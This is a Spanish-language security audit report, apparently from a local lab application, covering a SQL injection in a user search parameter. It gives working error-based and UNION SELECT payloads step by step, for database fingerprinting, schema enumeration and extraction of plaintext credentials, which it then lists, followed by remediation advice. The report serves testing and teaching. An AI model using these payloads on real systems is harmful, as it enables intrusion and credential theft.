# Informe de Auditoría de Seguridad - SQL Injection
**Fecha:** 2026-04-30 15:28:29  
**Objetivo:** http://web.dev.local:8083  
**Tipo de vulnerabilidad:** SQL Injection (Error-based + UNION-based)

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite extraer toda la información de la base de datos, incluyendo credenciales de usuarios en texto plano.

---

## Descripción de la Aplicación

La aplicación web presenta un formulario de búsqueda de usuarios con un único campo `id` (GET). La URL base es:

```
http://web.dev.local:8083/?id=<valor>&Submit=Submit
```

---

## Vulnerabilidades Encontradas

### 1. SQL Injection - UNION Based (Crítica)

**Parámetro vulnerable:** `id` (método GET)  
**Tipo:** Error-based + UNION SELECT  
**Base de datos:** MariaDB 10.11.14  

#### Prueba de concepto - Error SQL

Al insertar una comilla simple se obtiene un error de sintaxis SQL:

```
GET /?id=1'&Submit=Submit
```

**Respuesta:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma que:
- El input no está sanitizado
- Los errores SQL son visibles en la respuesta
- La ruta del archivo fuente es `/var/www/html/low.php`

#### Prueba de concepto - OR 1=1 (Dump de todos los registros)

```
GET /?id=1'+OR+'1'='1&Submit=Submit
```

Retorna todos los usuarios de la tabla, confirmando la inyección.

#### Prueba de concepto - UNION SELECT (Extracción de datos)

La consulta original tiene **2 columnas**. Payload confirmado:

```
GET /?id=0'+UNION+SELECT+1,2--+-&Submit=Submit
```

---

## Explotación

### Información del servidor de base de datos

```sql
0' UNION SELECT version(),user()-- -
```

| Campo | Valor |
|-------|-------|
| Versión BD | `10.11.14-MariaDB-ubu2204` |
| Usuario BD | `root@172.18.0.3` |
| Base de datos activa | `sqli_demo` |

> ⚠️ La aplicación se conecta como **root**, lo que maximiza el impacto.

### Enumeración de tablas

```sql
0' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -
```

**Tablas encontradas:**
- `users` (en base de datos `sqli_demo`)

### Enumeración de columnas

```sql
0' UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_schema=database()-- -
```

**Columnas de la tabla `users`:**
- `user_id`
- `first_name`
- `last_name`
- `username`
- `password`
- `email`

### Extracción de credenciales

```sql
0' UNION SELECT CONCAT(username,':',password),email FROM users-- -
```

**Credenciales extraídas (texto plano):**

| Usuario | Contraseña | Email |
|---------|-----------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

> ⚠️ Las contraseñas están almacenadas en **texto plano**, lo que agrava el riesgo.

---

## Análisis de Impacto

| Criterio | Evaluación |
|----------|-----------|
| **Confidencialidad** | CRÍTICA - Exposición total de credenciales y datos de usuarios |
| **Integridad** | ALTA - Usuario root permite INSERT/UPDATE/DELETE |
| **Disponibilidad** | ALTA - Posible DROP DATABASE con privilegios root |
| **CVSS estimado** | 9.8 (Crítico) |

---

## Causa Raíz

El código fuente (en `/var/www/html/low.php`) construye la consulta SQL concatenando directamente el input del usuario sin sanitización:

```php
// Ejemplo del patrón vulnerable
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas:**
   ```php
   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y sanitizar el input:** Verificar que el parámetro `id` sea un entero válido antes de usarlo.

3. **Deshabilitar la visualización de errores en producción:** Configurar `display_errors = Off` en PHP.

4. **Principio de mínimo privilegio:** La aplicación no debe conectarse a la BD como `root`. Usar un usuario con permisos solo de lectura.

5. **Almacenar contraseñas con hash:** Usar `password_hash()` con bcrypt en lugar de texto plano.

6. **Implementar WAF:** Un Web Application Firewall puede detectar y bloquear patrones de SQLi.

---

## Conclusión

La aplicación presenta una vulnerabilidad de **SQL Injection crítica** que ha sido explotada exitosamente para:
- Confirmar el motor de base de datos (MariaDB 10.11.14)
- Identificar que la aplicación corre como usuario `root`
- Enumerar todas las tablas y columnas de la base de datos
- Extraer las credenciales completas de 8 usuarios en texto plano

Se requiere corrección inmediata antes de exponer la aplicación a entornos de producción.
